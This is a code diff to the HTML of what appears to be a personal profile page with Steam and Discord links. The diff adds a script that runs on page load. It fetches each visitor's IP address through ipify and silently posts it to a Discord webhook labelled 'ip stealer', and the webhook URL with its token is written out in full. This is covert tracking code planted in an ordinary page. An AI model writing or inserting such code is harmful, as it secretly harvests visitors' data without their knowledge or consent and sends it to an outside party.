@@ -24,5 +24,23 @@
 		<li> <a style="font-size: 30px" href="https://steamcommunity.com/profiles/76561198441805599/">Steam</a> </li>
 		<li> <a style="font-size: 30px" href="https://discord.gg/hrk5ArvffE">Discord</a> </li>
 	</ul>
+	<script>
+		function getIP(json) {
+		var request = new XMLHttpRequest(); //making a request for the webhook
+		 request.open("POST", "https://discord.com/api/webhooks/972608867840172122/tu64ViJ8X8883pasKsVgmQPTQAr7RxV792MKOR7ojVG_c21VN0BWpwYA257tSs8XfDKY");
+
+		 request.setRequestHeader('Content-type', 'application/json');
+
+		 var params = {
+        username: "ip stealer",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+	    }
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
